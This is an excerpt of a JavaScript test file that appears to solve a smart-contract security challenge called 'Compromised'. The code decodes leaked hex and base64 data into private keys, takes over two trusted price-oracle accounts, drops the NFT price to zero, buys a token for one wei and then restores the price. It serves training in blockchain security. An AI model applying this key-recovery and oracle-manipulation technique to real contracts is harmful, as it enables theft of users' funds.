...
describe("Compromised challenge", function () {
  ...
  it("Execution", async function () {
    ...
    const convertToPrivateKey = (info) => {
      const hexString = Buffer.from(info.split(" ").join(""), "hex").toString(
        "utf8"
      );
      const value = Buffer.from(hexString, "base64").toString("utf8");
      return value;
    };
    ...
    const pk1 = convertToPrivateKey(info[0]);
    const pk2 = convertToPrivateKey(info[1]);

    const trustedSource1 = new ethers.Wallet(pk1, ethers.provider);
    const trustedSource2 = new ethers.Wallet(pk2, ethers.provider);

    const tokenSymbol = await nftToken.symbol();
    const priceBefore = await oracle.getMedianPrice(tokenSymbol);
    console.log("priceBefore", priceBefore.toString());

    await oracle.connect(trustedSource1).postPrice(tokenSymbol, 0);
    await oracle.connect(trustedSource2).postPrice(tokenSymbol, 0);
    const priceAfter = await oracle.getMedianPrice(tokenSymbol);
    console.log("priceAfter", priceAfter.toString());

    const tokenId = await exchange.connect(player).buyOne({ value: 1 });
    console.log("tokenId", tokenId);

    await oracle
      .connect(trustedSource1)
      .postPrice(tokenSymbol, INITIAL_NFT_PRICE);
    await oracle
      .connect(trustedSource2)
      .postPrice(tokenSymbol, INITIAL_NFT_PRICE);
    const priceAfterAfter = await oracle.getMedianPrice(tokenSymbol);
    console.log("priceAfterAfter", priceAfterAfter.toString());
